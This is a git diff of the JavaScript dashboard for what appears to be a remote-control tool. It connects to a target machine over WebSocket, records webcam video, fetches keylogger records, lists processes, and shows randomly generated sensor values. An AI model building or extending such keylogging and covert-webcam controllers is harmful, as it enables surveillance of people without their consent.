@@ -1,6 +1,6 @@
 ﻿let websocket = null;
 
-// BIẾN QUẢN LÝ THỜI GIAN (LOGIC HOME MỚI)
+// BIEN QUAN LY THOI GIAN
 let intervalUptime = null;
 let intervalSensors = null;
 let intervalPing = null;
@@ -15,7 +15,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const btnConnect = document.getElementById("btnConnect");
     if(btnConnect) btnConnect.addEventListener("click", connectToServer);
 
-    // Mặc định gọi hàm reset để hiện trạng thái chưa kết nối
+    // Reset giao dien ve mac dinh
     resetDashboardState();
 });
 
@@ -70,13 +70,16 @@ function connectToServer() {
         websocket.onopen = () => {
             setConnectedState(true);
             addActivityLog("Connected to Server: " + ip);
-            // BẮT ĐẦU CẬP NHẬT DASHBOARD
+            
+            // GUI LENH LAY THONG TIN MAY NGAY LAP TUC
+            sendCmd("get-sys-info");
+            
+            // BAT DAU CAP NHAT DASHBOARD
             startDashboardUpdates();
         };
         websocket.onclose = () => {
             setConnectedState(false);
             addActivityLog("Connection Closed");
-            // DỪNG CẬP NHẬT
             stopDashboardUpdates();
         };
         websocket.onerror = (e) => {
@@ -96,22 +99,16 @@ function connectToServer() {
 function setConnectedState(isConnected) {
     const dot = document.getElementById("connection-dot");
     const btnText = document.getElementById("btn-text");
-    const sysNetwork = document.getElementById("sys-network"); // Ô Network trong Info
+    const sysNetwork = document.getElementById("sys-network");
 
     if (isConnected) {
         if(dot) { dot.classList.remove("disconnected"); dot.classList.add("connected"); }
         if(btnText) btnText.innerText = "Connected";
-        if(sysNetwork) {
-            sysNetwork.innerText = "Connected";
-            sysNetwork.style.color = "#34d399"; // Xanh
-        }
+        if(sysNetwork) { sysNetwork.innerText = "Connected"; sysNetwork.style.color = "#34d399"; }
     } else {
         if(dot) { dot.classList.remove("connected"); dot.classList.add("disconnected"); }
         if(btnText) btnText.innerText = "Connect";
-        if(sysNetwork) {
-            sysNetwork.innerText = "Disconnected";
-            sysNetwork.style.color = "#fb7185"; // Đỏ
-        }
+        if(sysNetwork) { sysNetwork.innerText = "Disconnected"; sysNetwork.style.color = "#fb7185"; }
     }
 }
 
@@ -124,10 +121,9 @@ function sendCmd(command) {
     }
 }
 
-// --- LOGIC CẬP NHẬT HOME (THEO YÊU CẦU MỚI) ---
+// --- LOGIC DASHBOARD ---
 
 function resetDashboardState() {
-    // Reset về --- khi chưa kết nối
     document.getElementById("sys-hostname").innerText = "---";
     document.getElementById("sys-os").innerText = "---";
     document.getElementById("sys-uptime").innerText = "--:--:--";
@@ -145,50 +141,39 @@ function resetDashboardState() {
 }
 
 function startDashboardUpdates() {
-    // 1. Cập nhật thông tin tĩnh ngay lập tức
-    document.getElementById("sys-hostname").innerText = "DESKTOP-CLIENT";
-    document.getElementById("sys-os").innerText = "Windows 10 Pro";
     systemStartTime = Date.now(); 
 
-    // 2. Uptime: Cập nhật mỗi 1 giây
+    // Uptime: 1s
     if(intervalUptime) clearInterval(intervalUptime);
     intervalUptime = setInterval(() => {
         const now = Date.now();
         const diff = Math.floor((now - systemStartTime) / 1000);
-        
         const h = Math.floor(diff / 3600).toString().padStart(2, '0');
         const m = Math.floor((diff % 3600) / 60).toString().padStart(2, '0');
         const s = (diff % 60).toString().padStart(2, '0');
-        
         document.getElementById("sys-uptime").innerText = `${h}:${m}:${s}`;
     }, 1000);
 
-    // 3. Ping: Cập nhật mỗi 2 giây (trong khoảng 1-3s)
+    // Ping: 2s
     if(intervalPing) clearInterval(intervalPing);
     intervalPing = setInterval(() => {
         const ping = Math.floor(Math.random() * 20) + 10; 
         document.getElementById("sensor-ping").innerText = `${ping} ms`;
     }, 2000);
 
-    // 4. Sensors & Charts: Cập nhật mỗi 4 giây (trong khoảng 3-5s)
+    // Sensors: 4s
     if(intervalSensors) clearInterval(intervalSensors);
     intervalSensors = setInterval(() => {
-        // CPU Temp
         const temp = Math.floor(Math.random() * 15) + 45; 
         document.getElementById("sensor-temp").innerText = `${temp}°C`;
-
-        // CPU Usage
         const cpu = Math.floor(Math.random() * 30) + 20;
         const chartCpu = document.getElementById("chart-cpu");
         chartCpu.style.setProperty('--p', cpu);
         chartCpu.querySelector('span').innerText = cpu + "%";
-
-        // RAM Usage
         const ram = Math.floor(Math.random() * 20) + 50;
         const chartRam = document.getElementById("chart-ram");
         chartRam.style.setProperty('--p', ram);
         chartRam.querySelector('span').innerText = ram + "%";
-
     }, 4000);
 }
 
@@ -199,28 +184,45 @@ function stopDashboardUpdates() {
     resetDashboardState();
 }
 
-// --- XỬ LÝ DỮ LIỆU TỪ SERVER (GIỮ NGUYÊN) ---
+// --- XU LY DU LIEU ---
 function handleIncomingMessage(data) {
-    if (data.startsWith("file ")) {
+    // 1. SYSTEM INFO
+    if (data.startsWith("sys-info ")) {
+        const infoPart = data.substring(9);
+        const parts = infoPart.split("|");
+        if (parts.length >= 2) {
+            const hostname = parts[0];
+            const os = parts[1];
+            document.getElementById("sys-hostname").innerText = hostname;
+            document.getElementById("sys-os").innerText = os;
+            addActivityLog(`System Info Updated: ${hostname} (${os})`);
+        }
+    }
+    // 2. VIDEO
+    else if (data.startsWith("file ")) {
         const base64 = data.substring(5).trim();
         handleVideoFile(base64); 
         addActivityLog("Webcam video received");
         updateHomeStatus("webcam", "Idle");
     } 
+    // 3. KEYLOG
     else if (data.startsWith("KEYLOG_DATA:")) {
         const box = document.getElementById("keylog-output");
         if(box) box.innerHTML = data.substring(12);
         addActivityLog("Fetched Keylogger records");
     }
+    // 4. PROCESS LIST
     else if (data.includes("PID") && data.includes("RAM")) {
         renderProcessTable(data, "process-list-body");
         renderProcessTable(data, "app-list-body");
         addActivityLog("Process/App list updated");
     }
+    // 5. TEXT MSG
     else {
         console.log("Server:", data);
-        if(data.includes("Keylogger da bat dau")) updateHomeStatus("keylog", "Active");
-        if(data.includes("Keylogger da dung lai")) updateHomeStatus("keylog", "Idle");
+        // Cập nhật string check tiếng Anh
+        if(data.includes("Keylogger started")) updateHomeStatus("keylog", "Active");
+        if(data.includes("Keylogger stopped")) updateHomeStatus("keylog", "Idle");
         if(data.includes("Server:")) addActivityLog(data.replace("Server: ", ""));
     }
 }
@@ -248,12 +250,7 @@ function renderProcessTable(rawData, tableId) {
         const cols = rows[i].split('\t');
         if (cols.length >= 4) {
             const tr = document.createElement("tr");
-            tr.innerHTML = `
-                <td><strong>${cols[0]}</strong></td>
-                <td>${cols[3]}</td> 
-                <td>${cols[2]}</td>
-                <td>${cols[1]}</td>
-            `;
+            tr.innerHTML = `<td><strong>${cols[0]}</strong></td><td>${cols[3]}</td><td>${cols[2]}</td><td>${cols[1]}</td>`;
             tbody.appendChild(tr);
         }
     }
@@ -268,7 +265,6 @@ function requestWebcam() {
     }
     updateHomeStatus("webcam", "Recording");
     if(typeof lucide !== 'undefined') lucide.createIcons();
-    
     sendCmd("capture"); 
 }
 
@@ -278,34 +274,22 @@ function handleVideoFile(base64) {
         btn.innerHTML = `<i data-lucide="radio" class="btn-icon-inside"></i> Record 10s`;
         btn.disabled = false;
     }
-
     try {
         const byteChars = atob(base64);
         const byteNumbers = new Array(byteChars.length);
-        for (let i = 0; i < byteChars.length; i++) {
-            byteNumbers[i] = byteChars.charCodeAt(i);
-        }
+        for (let i = 0; i < byteChars.length; i++) byteNumbers[i] = byteChars.charCodeAt(i);
         const byteArray = new Uint8Array(byteNumbers);
         const blob = new Blob([byteArray], {type: "video/mp4"});
         const url = URL.createObjectURL(blob);
-
         const previewBox = document.getElementById("webcam-preview");
-        if(previewBox) {
-            previewBox.innerHTML = `<video src="${url}" controls autoplay style="width:100%; height:100%; border-radius:16px;"></video>`;
-        }
-
+        if(previewBox) previewBox.innerHTML = `<video src="${url}" controls autoplay style="width:100%; height:100%; border-radius:16px;"></video>`;
         const downloadArea = document.getElementById("webcam-download-area");
         if(downloadArea) {
-            downloadArea.innerHTML = `
-                <a href="${url}" download="webcam_capture.mp4" class="btn-download-pill">
-                    <i data-lucide="download"></i> Download Video
-                </a>
-            `;
+            downloadArea.innerHTML = `<a href="${url}" download="webcam_capture.mp4" class="btn-download-pill"><i data-lucide="download"></i> Download Video</a>`;
             if(typeof lucide !== 'undefined') lucide.createIcons();
         }
     } catch (e) {
         console.error("Error decoding video:", e);
-        alert("Lỗi khi tải video từ server!");
     }
 }
 
